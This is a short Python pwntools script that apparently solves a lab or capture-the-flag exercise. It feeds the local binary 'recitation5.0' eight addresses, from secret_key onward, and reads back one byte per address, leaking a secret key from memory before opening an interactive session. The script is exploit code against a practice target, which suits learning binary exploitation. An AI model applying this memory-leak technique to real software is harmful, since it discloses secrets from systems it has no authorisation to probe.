from pwn import *

# context.log_level = "DEBUG"
e = ELF("./recitation5.0", checksec=False)

p = process("./recitation5.0")
for i in range(0,8):
    p.recvuntil(b"r!\n")
    p.send(p64(e.symbols.secret_key + i))
    print(p.recv(1))
p.interactive()
